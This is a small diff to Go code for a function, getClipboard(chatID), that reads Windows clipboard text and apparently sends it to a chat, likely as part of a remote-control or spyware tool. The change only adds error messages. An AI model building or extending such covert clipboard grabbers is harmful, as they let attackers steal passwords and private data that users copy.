@@ -30,12 +30,14 @@ func getClipboard(chatID int64) {
 	// Open the clipboard
 	ret, _, _ := openClipboard.Call(0)
 	if ret == 0 {
+		responseStr = "Error OpenClipboard()"
 		goto close_and_send	
 	}
 
 	// Get the clipboard data
 	h, _, _ = getClipboardData.Call(uintptr(CF_UNICODETEXT))
 	if h == 0 {
+		responseStr = "Error GetClipboardData()"
 		goto close_and_send	
 	}
 
